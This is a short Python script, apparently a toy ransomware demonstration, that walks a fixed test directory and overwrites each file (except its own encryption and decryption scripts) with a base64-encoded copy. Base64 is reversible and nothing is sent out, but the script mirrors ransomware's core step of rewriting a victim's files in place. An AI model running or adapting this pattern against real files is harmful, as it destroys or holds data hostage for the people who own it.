import os
import base64

# Directory containing the files to be "encrypted"
directory = "/home/immortal/ransomware_test"

# Function to encrypt a file using base64 encoding (for demonstration)
def encrypt_file(file_path):
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = base64.b64encode(file_data)
    
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Encrypt the specific file (excluding encryption.py and decryption.py)
for filename in os.listdir(directory):
    file_path = os.path.join(directory, filename)
    
    if os.path.isfile(file_path) and filename not in ['decryption.py', 'encryption.py']:
        encrypt_file(file_path)
        print(f"Encrypted: {file_path}")
